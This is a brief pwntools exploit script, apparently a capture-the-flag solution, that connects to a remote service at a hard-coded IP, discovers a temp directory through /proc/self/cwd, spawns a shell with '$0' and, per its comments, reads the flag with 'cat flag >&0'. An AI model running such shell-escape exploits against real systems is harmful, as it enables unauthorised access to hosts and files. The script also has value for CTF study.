from pwn import*
p = remote('47.103.214.163',21000)
context.log_level = 'debug'
p.sendline('ls -l /proc/self/cwd')
p.recvuntil('/tmp')
dir = '/tmp'+p.recvuntil('\n',drop = True)
p.sendline(dir)
p.sendline("$0")
p.interactive()

#1.cd /
#2.cat flag >&0
